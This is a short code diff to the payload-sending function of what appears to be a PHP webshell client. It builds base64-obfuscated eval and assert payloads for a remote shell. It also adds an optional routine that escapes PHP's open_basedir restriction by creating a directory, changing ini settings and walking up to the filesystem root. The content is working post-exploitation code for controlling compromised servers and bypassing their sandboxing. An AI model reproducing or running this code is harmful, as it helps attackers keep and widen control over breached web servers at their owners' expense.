@@ -88,7 +88,15 @@ def send(data: str, raw: bool = False, **extra_params):
     tail = randstr(offset)
     pwd_b64 = b64encode(gget("webshell.pwd", "webshell").encode()).decode()
     if not raw:
-        data = f"""eval('error_reporting(0);chdir(base64_decode("{pwd_b64}"));print(\\'{head}\\');eval(base64_decode("{base64_encode(data)}"));print(\\'{tail}\\');');"""
+        data = f"""error_reporting(0);chdir(base64_decode("{pwd_b64}"));print("{head}");""" + data
+        data += f"""print("{tail}");"""
+        if (gget("webshell.bypass_obd")):
+            data += """$dir=pos(glob("./*", GLOB_ONLYDIR));$cwd=getcwd();$ndir="./test";
+if($dir === false){$r=mkdir($ndir);if($r === false){die('bypass opendir failed!');}else{$dir=$ndir;}}
+chdir($dir);ini_set("open_basedir","..");$c=substr_count(getcwd(), "/");for($i=0;$i<$c;$i++) chdir("..");
+ini_set("open_basedir", "/");chdir($cwd);rmdir($ndir);"""
+        data = f"""eval(base64_decode("{base64_encode(data)}"));"""
+        # data = f"""eval('error_reporting(0);chdir(base64_decode("{pwd_b64}"));print(\\'{head}\\');eval(base64_decode("{base64_encode(data)}"));print(\\'{tail}\\');');"""
         if (not php_v7):
             data = f"""assert(base64_decode("{base64_encode(data)}"));"""
     for func in encode_functions:
